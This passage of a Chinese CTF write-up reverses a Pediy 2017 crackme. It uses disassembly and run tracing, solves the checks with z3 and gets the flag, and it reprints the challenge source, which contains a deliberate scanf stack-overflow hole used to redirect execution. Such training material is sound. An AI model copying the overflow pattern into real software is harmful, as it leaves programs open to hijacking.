plain"><table><tr><td class="code"><pre><span class="line">.text:00401090 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 ; Attributes: bp-based frame</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 sub_401090      proc near               ; CODE XREF: _main+1Cp</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 var_C           &#x3D; dword ptr -0Ch</span><br><span class="line">.text:00401090 var_8           &#x3D; dword ptr -8</span><br><span class="line">.text:00401090 var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090                 push    ebp</span><br><span class="line">.text:00401091                 mov     ebp, esp</span><br><span class="line">.text:00401093                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:00401096                 test    ecx, ecx</span><br><span class="line">.text:00401098                 jz      short loc_4010D7</span><br><span class="line">.text:0040109A                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040109D                 test    edx, edx</span><br><span class="line">.text:0040109F                 jz      short loc_4010D7</span><br><span class="line">.text:004010A1                 mov     eax, ecx</span><br><span class="line">.text:004010A3                 sub     eax, edx</span><br><span class="line">.text:004010A5                 jz      short loc_4010D7</span><br><span class="line">.text:004010A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:004010AA                 imul    eax, 5</span><br><span class="line">.text:004010AD                 add     ecx, eax</span><br><span class="line">.text:004010AF                 cmp     ecx, 8F503A42h</span><br><span class="line">.text:004010B5                 jnz     short loc_4010D7</span><br><span class="line">.text:004010B7                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:004010BA                 imul    eax, 0Dh</span><br><span class="line">.text:004010BD                 add     edx, eax</span><br><span class="line">.text:004010BF                 cmp     edx, 0EF503A42h</span><br><span class="line">.text:004010C5                 jnz     short loc_4010D7</span><br><span class="line">.text:004010C7                 mov     edx, 543F30h</span><br><span class="line">.text:004010CC                 xor     edx, 158F04h</span><br><span class="line">.text:004010D2                 mov     eax, [edx]</span><br><span class="line">.text:004010D4                 dec     eax</span><br><span class="line">.text:004010D5                 mov     [edx], eax</span><br><span class="line">.text:004010D7</span><br><span class="line">.text:004010D7 loc_4010D7:                             ; CODE XREF: sub_401090+8j</span><br><span class="line">.text:004010D7                                         ; sub_401090+Fj ...</span><br><span class="line">.text:004010D7                 mov     esp, ebp</span><br><span class="line">.text:004010D9                 pop     ebp</span><br><span class="line">.text:004010DA                 retn</span><br><span class="line">.text:004010DA sub_401090      endp</span><br><span class="line">.text:004010DA</span><br><span class="line">.text:004010DA ; </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/07/16/5b4c64ebf02eb.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64ebf02eb.jpg" class="lazyload"></a></p><p>方程</p><blockquote><p>x!=0<br>y!=0<br>x!=y<br>5(y-x)+y=0x8F503A42<br>13(y-x)+x=0xEF503A42</p></blockquote><blockquote><p>sub_4010E0<br><a href="https://i.loli.net/2018/07/16/5b4c64ec1506a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64ec1506a.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c652d32a3b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652d32a3b.jpg" class="lazyload"></a></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:004010E0 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 ; Attributes: bp-based frame</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 sub_4010E0      proc near               ; CODE XREF: _main+21p</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 var_C           &#x3D; dword ptr -0Ch</span><br><span class="line">.text:004010E0 var_8           &#x3D; dword ptr -8</span><br><span class="line">.text:004010E0 var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0                 push    ebp</span><br><span class="line">.text:004010E1                 mov     ebp, esp</span><br><span class="line">.text:004010E3                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:004010E6                 test    ecx, ecx</span><br><span class="line">.text:004010E8                 jz      short loc_401127</span><br><span class="line">.text:004010EA                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:004010ED                 test    edx, edx</span><br><span class="line">.text:004010EF                 jz      short loc_401127</span><br><span class="line">.text:004010F1                 mov     eax, ecx</span><br><span class="line">.text:004010F3                 sub     eax, edx</span><br><span class="line">.text:004010F5                 jz      short loc_401127</span><br><span class="line">.text:004010F7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:004010FA                 imul    eax, 11h</span><br><span class="line">.text:004010FD                 add     ecx, eax</span><br><span class="line">.text:004010FF                 cmp     ecx, 0F3A94883h</span><br><span class="line">.text:00401105                 jnz     short loc_401127</span><br><span class="line">.text:00401107                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:0040110A                 imul    eax, 7</span><br><span class="line">.text:0040110D                 add     edx, eax</span><br><span class="line">.text:0040110F                 cmp     edx, 33A94883h</span><br><span class="line">.text:00401115                 jnz     short loc_401127</span><br><span class="line">.text:00401117                 mov     edx, 543F30h</span><br><span class="line">.text:0040111C                 xor     edx, 158F04h</span><br><span class="line">.text:00401122                 mov     eax, [edx]</span><br><span class="line">.text:00401124                 dec     eax</span><br><span class="line">.text:00401125                 mov     [edx], eax</span><br><span class="line">.text:00401127</span><br><span class="line">.text:00401127 loc_401127:                             ; CODE XREF: sub_4010E0+8j</span><br><span class="line">.text:00401127                                         ; sub_4010E0+Fj ...</span><br><span class="line">.text:00401127                 mov     esp, ebp</span><br><span class="line">.text:00401129                 pop     ebp</span><br><span class="line">.text:0040112A                 retn</span><br><span class="line">.text:0040112A sub_4010E0      endp</span><br><span class="line">.text:0040112A</span><br><span class="line">.text:0040112A ; </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/07/16/5b4c652d46d23.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652d46d23.jpg" class="lazyload"></a></p><p>方程</p><blockquote><p>x!=0<br>y!=0<br>x!=y<br>17(y-x)+y=0xF3A94883<br>7(y-x)+x=0x33A94883</p></blockquote><p>这两个函数的方程要满足唯一解很难，并且也不是出题人本意，据说有人解了一天没解出来</p><h2 id="更换思路"><a href="#更换思路" class="headerlink" title="更换思路"></a>更换思路</h2><p>我们再回到主函数分析，再次看到这个scanf(),并且往后翻有大量未识别的数据，从00413131开始<br><a href="https://i.loli.net/2018/07/16/5b4c652d5a74d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652d5a74d.jpg" class="lazyload"></a></p><p>于是我们可以考虑一下<strong>缓冲区溢出</strong></p><p><a href="https://i.loli.net/2018/07/16/5b4c652d6ffc0.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652d6ffc0.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/16/5b4c652d94199.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652d94199.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c652da7a36.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652da7a36.jpg" class="lazyload"></a></p><p>可以看到，我们输入信息一开始保存在0012FF2C,栈清空后保存在0012FF3C，于是十六进制下3C-2C=10，也就是十进制下的16。<strong>因此如果要覆盖返回地址需要构造12字节的信息外加4个字节的返回地址。</strong><br>我们事实上可以直接覆盖到You get it的地址，因为比赛限制flag只为字母和数字，因此需要另想其他办法</p><p>在IDA中往下翻翻，看到有一大串未识别的数据，于是猜想有可能应该溢出到这里<br><a href="https://i.loli.net/2018/07/16/5b4c652dbaf5e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652dbaf5e.jpg" class="lazyload"></a><br>首地址为00413131<br>转换成ASCII为A11<br>因为数据在内存中为小段排序，于是应该转换为11A<br>所以我们可以使用测试数据1234567890ab11A来溢出到那段数据</p><p>成功跳入，然后右键分析-&gt;从模块中删除分析识别出正确代码。<br>看到一堆跳转<br><a href="https://i.loli.net/2018/07/16/5b4c652ddf9e7.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652ddf9e7.jpg" class="lazyload"></a></p><p>这里是花指令了</p><h3 id="使用RUN跟踪去除花指令"><a href="#使用RUN跟踪去除花指令" class="headerlink" title="使用RUN跟踪去除花指令"></a>使用RUN跟踪去除花指令</h3><p>断在0x413131处后, 点击菜单栏的”查看”, 选择”RUN跟踪”, 然后再点击”调试”, 选择”跟踪步入”, 程序会记录这段花指令执行的过程<br><a href="https://i.loli.net/2018/07/16/5b4c652e1124e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c652e1124e.jpg" class="lazyload"></a></p><p>我觉得应该是把最后一栏显示寄存器的指令提取出来<br>但目前程序显示错误<br><a href="https://i.loli.net/2018/07/16/5b4c653d3e989.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c653d3e989.jpg" class="lazyload"></a><br>所以先从前向后记录这些有用指令，然后在下面发现一个奇怪的跳转<br><a href="https://i.loli.net/2018/07/16/5b4c653d6140f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c653d6140f.jpg" class="lazyload"></a><br>这个跳转后面没有short，也不显示寄存器，而且显然跳转之后导致了错误，因此我们把这里的跳转改掉或下断点修改标志位，重新跟踪<br>然后还有两个jnz<br><a href="https://i.loli.net/2018/07/16/5b4c653d86588.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c653d86588.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c653da9f9f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c653da9f9f.jpg" class="lazyload"></a></p><p>最后一个跳转修改完，跟踪会抛出一个异常<br><a href="https://i.loli.net/2018/07/16/5b4c653dc094c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c653dc094c.jpg" class="lazyload"></a></p><p>我们提取这之前的有效代码,一共三段验证</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vaild_1:</span><br><span class="line">00413131    83C4 F0         add esp,-0x10</span><br><span class="line">00413150    33C0            xor eax,eax</span><br><span class="line">00413184    A3 34B04100     mov dword ptr ds:[0x41B034],eax</span><br><span class="line">004131BA    58              pop eax</span><br><span class="line">004131EB    8BC8            mov ecx,eax                            </span><br><span class="line">0041321F    58              pop eax</span><br><span class="line">00413254    8BD8            mov ebx,eax                </span><br><span class="line">00413289    58              pop eax</span><br><span class="line">004132B5    8BD0            mov edx,eax                    </span><br><span class="line">004132AD    8BD0            mov edx,eax</span><br><span class="line">004132E2    8BC1            mov eax,ecx</span><br><span class="line">00413316    2BC3            sub eax,ebx                </span><br><span class="line">00413349    C1E0 02         shl eax,0x2</span><br><span class="line">00413380    03C1            add eax,ecx</span><br><span class="line">004133B5    03C2            add eax,edx</span><br><span class="line">004133E9    2D E217F9EA     sub eax,0xEAF917E2</span><br><span class="line">00413420   &#x2F;0F85 DD060000   jnz ctf2017_.00413B03</span><br><span class="line"> </span><br><span class="line">vaild_2:                   </span><br><span class="line">00413455    03C1            add eax,ecx                                </span><br><span class="line">00413489    2BC3            sub eax,ebx                </span><br><span class="line">004134BF    8BD8            mov ebx,eax                </span><br><span class="line">004134F3    D1E0            shl eax,1                      </span><br><span class="line">00413525    03C3            add eax,ebx                </span><br><span class="line">00413559    03C1            add eax,ecx                </span><br><span class="line">0041358F    8BC8            mov ecx,eax                </span><br><span class="line">004135C3    03C2            add eax,edx                </span><br><span class="line">004135F7    2D C808F5E8     sub eax,0xE8F508C8</span><br><span class="line">0041362E   &#x2F;0F85 CF040000   jnz ctf2017_.00413B03</span><br><span class="line"> </span><br><span class="line">vaild_3</span><br><span class="line">00413665    8BC1            mov eax,ecx                </span><br><span class="line">0041365D    8BC1            mov eax,ecx</span><br><span class="line">004136A7    2BC2            sub eax,edx                </span><br><span class="line">004136D8    2D 683C0A0C     sub eax,0xC0A3C68</span><br><span class="line">00413703   &#x2F;75 04           jnz short ctf2017_.00413709</span><br></pre></td></tr></table></figure></div><p>整理得到三个方程组</p><blockquote><p>((x - y) &lt;&lt; 2) + x + z == 0xEAF917E2<br>((x - y) &lt;&lt; 1) + (x - y) + x + z == 0xE8F508C8<br>((x - y) &lt;&lt; 1) + (x - y) + x - z == 0x0C0A3C68</p></blockquote><h2 id="利用z3约束求解器解方程"><a href="#利用z3约束求解器解方程" class="headerlink" title="利用z3约束求解器解方程"></a>利用z3约束求解器解方程</h2><p>Z3 is a theorem prover from Microsoft Research.<br>相关介绍和安装方法：  <a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">https://github.com/Z3Prover/z3</a></p><p>源码如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">from z3 import *</span><br><span class="line">x, y ,z &#x3D; BitVecs(&#39;x y z&#39;, 64)</span><br><span class="line">#x &#x3D; Real(&#39;x&#39;)</span><br><span class="line">#y &#x3D; Real(&#39;y&#39;)</span><br><span class="line">#z &#x3D; Real(&#39;z&#39;)</span><br><span class="line">solve(((x - y) &lt;&lt; 2) + x + z &#x3D;&#x3D; 0xEAF917E2,((x - y) &lt;&lt; 1) + (x - y) + x + z &#x3D;&#x3D; 0xE8F508C8,((x - y) &lt;&lt; 1) + (x - y) + x - z &#x3D;&#x3D; 0x0C0A3C68)</span><br></pre></td></tr></table></figure></div><p>运行后得到结果<br><code>[z = 1853187632, y = 1919903280, x = 1953723722]</code><br>转换为16进制<br>x = 0x7473754a<br>y = 0x726f6630<br>z = 0x6e756630</p><p>连起来转换为字符串<br><a href="https://i.loli.net/2018/07/16/5b4c653dd528d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c653dd528d.jpg" class="lazyload"></a><br>倒过来就是Just0for0fun<br>再加上溢出要用的11A<br>所以<br>flag=Just0for0fun11A</p><p><a href="https://i.loli.net/2018/07/16/5b4c653de79c8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c653de79c8.jpg" class="lazyload"></a></p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p><a href="https://bbs.pediy.com/thread-222404.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222404.htm</a></p><h3 id="主体-VC6"><a href="#主体-VC6" class="headerlink" title="主体(VC6)"></a>主体(VC6)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line"> </span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">int __cdecl Add3(int, int);                                 &#x2F;&#x2F; proc in asm obj</span><br><span class="line">char * __cdecl very2();                                     &#x2F;&#x2F; right verify proc, in asm obj, @413131</span><br><span class="line"> </span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125; &#x2F;* extern &quot;C&quot; *&#x2F;</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">inline void G()&#123; printf(&quot;You get it!\n&quot;);&#125;                  &#x2F;&#x2F; show good msg, will not have a chance to run</span><br><span class="line">inline void B()&#123; printf(&quot;Bad register-code, keep trying.\n&quot;);&#125;  &#x2F;&#x2F; show err msg</span><br><span class="line"> </span><br><span class="line">char * InputKey();                                          &#x2F;&#x2F; get register code, in stack</span><br><span class="line">void very1();                                               &#x2F;&#x2F; fake verify proc 1</span><br><span class="line">void very3();                                               &#x2F;&#x2F; fake verify proc 3</span><br><span class="line">int Flag&#x3D;0x21;                                              &#x2F;&#x2F; register flag, 21 is a bad-guy</span><br><span class="line">extern &quot;C&quot; int cFlag&#x3D;0x11;                                  &#x2F;&#x2F; anti-wrong jump flag</span><br><span class="line"> </span><br><span class="line">&lt;br&gt;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;\n Crackme for CTF2017 @Pediy.\n&quot;);             &#x2F;&#x2F; show welcome msg</span><br><span class="line">    char Key0[10];                                          &#x2F;&#x2F; local var, never use</span><br><span class="line">    char *p1;                                               &#x2F;&#x2F; pointor to stack var, useless</span><br><span class="line">    cFlag&#x3D;2;</span><br><span class="line">    p1&#x3D;InputKey();                                          &#x2F;&#x2F; get register code, it must over-flow to very2()</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;%s\n&quot;, p1);</span><br><span class="line">    very1();                                                &#x2F;&#x2F; useless</span><br><span class="line">    very3();                                                &#x2F;&#x2F; useless</span><br><span class="line">    if(cFlag&#x3D;&#x3D;0)</span><br><span class="line">        G();</span><br><span class="line">    else</span><br><span class="line">        B();                                        &#x2F;&#x2F; boom! bad cracker, just wonder where to verify it???</span><br><span class="line">    &#x2F;&#x2F;getch();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">char * InputKey()                                           &#x2F;&#x2F; get register code, it must over-flow to very2(), which is coded in ASM, with junk-code</span><br><span class="line">                                                            &#x2F;&#x2F; dword1 dword2 dword3 11A (address of very2, @413131 )</span><br><span class="line">&#123;</span><br><span class="line">    char Key[10];</span><br><span class="line">    char *p2;</span><br><span class="line">    p2&#x3D;(char *)&amp;Key;</span><br><span class="line">    printf(&quot; Coded by Fpc.\n\n&quot;);</span><br><span class="line">    printf(&quot; Please input your code: &quot;);</span><br><span class="line">    scanf(&quot;%s&quot;, Key);</span><br><span class="line">    return p2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="两个fake函数-asm"><a href="#两个fake函数-asm" class="headerlink" title="两个fake函数(asm)"></a>两个fake函数(asm)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __declspec(naked) very1()                                              &#x2F;&#x2F; useless</span><br><span class="line">&#123;</span><br><span class="line">    long int x, y, z;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        &#x2F;&#x2F;mov       eax, esp</span><br><span class="line">        &#x2F;&#x2F;sub       eax, 8</span><br><span class="line">        &#x2F;&#x2F;mov       edx, [eax]</span><br><span class="line">        &#x2F;&#x2F;mov       [ebp-4], edx</span><br><span class="line">        &#x2F;&#x2F;mov       edx, [eax+4]</span><br><span class="line">        &#x2F;&#x2F;mov       [ebp-8], edx</span><br><span class="line">        mov     ecx, [ebp-4]</span><br><span class="line">        test        ecx, ecx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     edx, [ebp-8]</span><br><span class="line">        test        edx, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        sub     eax, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     [ebp-0x0c], eax</span><br><span class="line">        imul        eax,  5</span><br><span class="line">        add     ecx, eax</span><br><span class="line">        cmp     ecx, 0x08f503a42</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     eax, [ebp-0x0c]</span><br><span class="line">        imul        eax, 13</span><br><span class="line">        add     edx, eax</span><br><span class="line">        cmp     edx, 0x0ef503a42</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     edx, 0x543f30                               &#x2F;&#x2F; dec flag, anti ida x-ref trick</span><br><span class="line">        xor     edx, 0x158f04</span><br><span class="line">        mov     eax, [edx]</span><br><span class="line">        dec     eax</span><br><span class="line">        mov     [edx], eax</span><br><span class="line">        &#x2F;&#x2F;mov       cFlag, eax</span><br><span class="line">    &#x2F;&#x2F;if (x&#x3D;&#x3D;0)</span><br><span class="line">    &#x2F;&#x2F;  goto end1;</span><br><span class="line">    &#x2F;&#x2F;if (y&#x3D;&#x3D;0)</span><br><span class="line">    &#x2F;&#x2F;  goto end1;</span><br><span class="line">    &#x2F;&#x2F;z&#x3D;x-y;</span><br><span class="line">    &#x2F;&#x2F;if (z&#x3D;&#x3D;0)</span><br><span class="line">    &#x2F;&#x2F;      goto end1;</span><br><span class="line">    &#x2F;&#x2F;if( ((x+z*5)&#x3D;&#x3D;0x08f503a42) &amp;&amp; ((y+z*13)&#x3D;&#x3D;0x0ef503a42) )</span><br><span class="line">    &#x2F;&#x2F;  G();</span><br><span class="line">end1:</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>和</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __declspec(naked) very3()                                              &#x2F;&#x2F; useless</span><br><span class="line">&#123;</span><br><span class="line">    long int x, y, z;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        mov     ecx, [ebp-4]</span><br><span class="line">        test        ecx, ecx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     edx, [ebp-8]</span><br><span class="line">        test        edx, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        sub     eax, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     [ebp-0x0c], eax</span><br><span class="line">        imul        eax,  17</span><br><span class="line">        add     ecx, eax</span><br><span class="line">        cmp     ecx, 0x0f3a94883</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     eax, [ebp-0x0c]</span><br><span class="line">        imul        eax, 7</span><br><span class="line">        add     edx, eax</span><br><span class="line">        cmp     edx, 0x033a94883</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     edx, 0x543f30</span><br><span class="line">        xor     edx, 0x158f04</span><br><span class="line">        mov     eax, [edx]</span><br><span class="line">        dec     eax</span><br><span class="line">        mov     [edx], eax</span><br><span class="line">end1:</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="验证部分-masm"><a href="#验证部分-masm" class="headerlink" title="验证部分(masm)"></a>验证部分(masm)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public  c very2     ;声明引出的proc</span><br><span class="line"> </span><br><span class="line">extern  cFlag:near</span><br><span class="line"> </span><br><span class="line">.code</span><br><span class="line">    db 10000 dup(0)             ; pushing addr of very2 to 413131 in exe-file</span><br><span class="line">    db 2000h  dup(0)</span><br><span class="line"> </span><br><span class="line">    db 0c3                  ; ret, give some sign for crackerz</span><br><span class="line">                        ;</span><br><span class="line">very2   proc    near c              ; right verify proc here, at 413131</span><br><span class="line">    add esp, -10                ; restore esp, crack must input:0c bytes regcode and addr of very2</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov DWORD ptr cFlag, eax</span><br><span class="line">    ;</span><br><span class="line">    ; check register code</span><br><span class="line">    ; correct register code at stack:</span><br><span class="line">    ;       Just_for_fun + 11A(addr of very2)</span><br><span class="line">    ;</span><br><span class="line">    ;解个三元一次方程</span><br><span class="line">    ;5x-4y+z&#x3D;A</span><br><span class="line">    ;4x-3y+z&#x3D;B</span><br><span class="line">    ;4x-3y-z&#x3D;C</span><br><span class="line">    ;</span><br><span class="line">    pop eax</span><br><span class="line">    mov ecx, eax        ;eax&#x3D;x      7473754a</span><br><span class="line">    pop eax         ;eax&#x3D;y      726f6630</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    pop eax         ;z      6e756630</span><br><span class="line">    mov edx, eax</span><br><span class="line">    mov eax, ecx        ;x</span><br><span class="line">    sub eax, ebx        ;x-y        2040f1a</span><br><span class="line">    shl eax, 2      ;4(x-y)     8103c68</span><br><span class="line">    add eax, ecx        ;x&#x3D;x+4(x-y) 7c83b1b2</span><br><span class="line">    add eax, edx        ;x&#x3D;x+4(x-y)+z   eaf917e2</span><br><span class="line">    sub eax, 0eaf917e2  ;A</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    add eax, ecx</span><br><span class="line">    sub eax, ebx        ;x-y</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    shl eax, 1</span><br><span class="line">    add eax, ebx        ;3(x-y)     60c2d4e</span><br><span class="line">    add eax, ecx        ;x+3(x-y)</span><br><span class="line">    mov ecx, eax        ;x+3(x-y)   7a7fa298</span><br><span class="line">    add eax, edx        ;x+3(x-y)+z e8f508c8</span><br><span class="line">    sub eax, 0e8f508c8  ;B</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    mov eax, ecx</span><br><span class="line">    sub eax, edx        ;x+3(x-y)-z c0a3c68</span><br><span class="line">    sub eax, 0c0a3c68   ;C</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    ;</span><br><span class="line">    ;eax&#x3D;0</span><br><span class="line">    ;ebx&#x3D;02040f1a</span><br><span class="line">    ;ecx&#x3D;7a7fa298</span><br><span class="line">    ;edx&#x3D;6e756630</span><br><span class="line">    pop eax         ; balance stack, eax&#x3D;413131</span><br><span class="line">    ;set flag to 0, show good cracker msg</span><br><span class="line">    xor eax, 8101       ;eax&#x3D;41b030, addr of flag</span><br><span class="line">    mov edi, eax</span><br><span class="line">    xor eax, eax</span><br><span class="line">    stosd           ;set flag</span><br><span class="line">    call @f</span><br><span class="line">    ;buffer for good message: &quot;You get it!&quot;, in 3 dwords</span><br><span class="line">    dd 0050600e8, 1702,1702</span><br><span class="line">@@:</span><br><span class="line">    ; recover good message in code segment</span><br><span class="line">    pop eax</span><br><span class="line">    push eax</span><br><span class="line">    mov edi, eax</span><br><span class="line">    ;push 20756f59</span><br><span class="line">    push 4e000969           ;first dword</span><br><span class="line">    pop eax</span><br><span class="line">    ;use ebx,edx 